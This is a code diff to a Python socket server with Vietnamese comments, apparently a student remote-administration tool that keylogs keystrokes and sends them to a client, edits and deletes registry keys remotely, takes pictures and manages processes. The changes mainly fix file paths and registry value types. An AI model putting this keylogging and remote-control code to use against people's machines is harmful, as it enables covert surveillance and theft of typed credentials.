@@ -21,7 +21,7 @@ PORT = 5050
 HEADER = 64
 FORMAT = 'utf-8'
 ADDR = (HOST,PORT)
-DIR = os.getcwd()
+DIR = os.path.dirname(__file__)
 
 """Tạo socket SERVER"""
 SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -246,7 +246,7 @@ def key_log(conn):
     """Hàm bắt sự kiện bàn phím ghi vào file keyLog.txt"""
     def get_keys(stop):
         def writeFile(key):
-            with open(DIR + "\keyLog.txt","a") as f:
+            with open(DIR + "\\keyLog.txt","a") as f:
                 k= str(key).replace("'","") 
                 if k.find("backspace") > 0:
                     f.write("Backspace")
@@ -275,14 +275,20 @@ def key_log(conn):
     
     """Hàm in phím gửi các phím đã bấm qua cho client"""       
     def printKeys(conn):
-        with open(DIR + "\keyLog.txt","r") as file:
-            s = file.read()
-        with open(DIR + "\keyLog.txt","w") as file:
-            file.write("")
-        if s == "":
-            s = "\0"
-        """Đọc từ file keyLog.txt lưu vào biến s gửi qua cho client"""
-        send(conn, s)
+        if os.path.isfile(DIR + "\\keyLog.txt"):  
+            s = ""
+            with open(DIR + "\\keyLog.txt","r") as file:
+                s = file.read()
+            with open(DIR + "\\keyLog.txt","w") as file:
+                file.write("")
+            if s == "":
+                s = "\0"
+            """Đọc từ file keyLog.txt lưu vào biến s gửi qua cho client"""
+            send(conn, s)
+        else:
+            with open(DIR + "\\keyLog.txt","w") as file:
+                file.write("")
+            send(conn, "\0")
     
     """Hàm bắt đầu hook key: Tạo 1 luồng mới để bắt sự kiện"""          
     def hookKey():
@@ -290,7 +296,7 @@ def key_log(conn):
         stop_threads = False
         t = threading.Thread(target= get_keys,args=(lambda : stop_threads, ))
         t.start()
-        with open(DIR + "\keyLog.txt","w") as f:
+        with open("keyLog.txt","w") as f:
             f.write("")
     
     """Hàm tắt hook key: Huỷ luồng mà hook key tạo ra"""    
@@ -298,7 +304,7 @@ def key_log(conn):
         global stop_threads
         stop_threads = True
         t.join() 
-        with open(DIR + "\keyLog.txt","w") as f:
+        with open(DIR + "\\keyLog.txt","w") as f:
             f.write("")
     
     """Nhận yêu cầu từ client và xử lí"""
@@ -346,7 +352,7 @@ def shutdown(conn):
 def REG(conn):
     """Nhận nội dung reg"""
     s = receive(conn)
-    with open("fileReg.reg","w") as f:
+    with open(DIR + "\\fileReg.reg","w") as f:
         f.write(s)
     
     check = True
@@ -400,7 +406,6 @@ def deletekey(key,sub_key):
             sub_key = winreg.EnumKey(open_key, 0)
             try:
                 winreg.DeleteKey(open_key, sub_key)
-                print("Removed %s\\%s " % (current_key, sub_key))
             except OSError:
                 delete_sub_key(key0, "\\".join([current_key,sub_key]))
 
@@ -450,10 +455,21 @@ def setvalue(key,sub_key,value_name,value,type_value):
         elif type_value == "Binary":
             type_value = winreg.REG_BINARY
         elif type_value == "DWORD":
+            try:
+                value = int(value)
+            except ValueError:
+                value = value
+                pass
             type_value = winreg.REG_DWORD
         elif type_value == "QWORD":
+            try:
+                value = int(value)
+            except ValueError:
+                value = value
+                pass
             type_value = winreg.REG_QWORD
-        elif type_value == "Multi-String":
+        elif type_value == "Multi-string":
+            value = value.split(" ")
             type_value =winreg.REG_MULTI_SZ
         elif type_value == "Expandable String":
             type_value = winreg.REG_EXPAND_SZ
@@ -482,7 +498,7 @@ def deletevalue(key,sub_key,value_name):
 """Hàm xử lí yêu cầu registry của client"""
 def registry(conn):
     """Tạo file .reg"""
-    with open("fileReg.reg","w") as f:
+    with open(DIR + "\\fileReg.reg","w") as f:
         f.close()
     
     """Nhận yêu cầu của client"""
@@ -532,7 +548,6 @@ def handle_client(conn):
             break
         elif msg == "REGISTRY":
             registry(conn)
-            pass
         elif msg == "TAKEPIC":
             take_pic(conn)
         elif msg == "PROCESS":
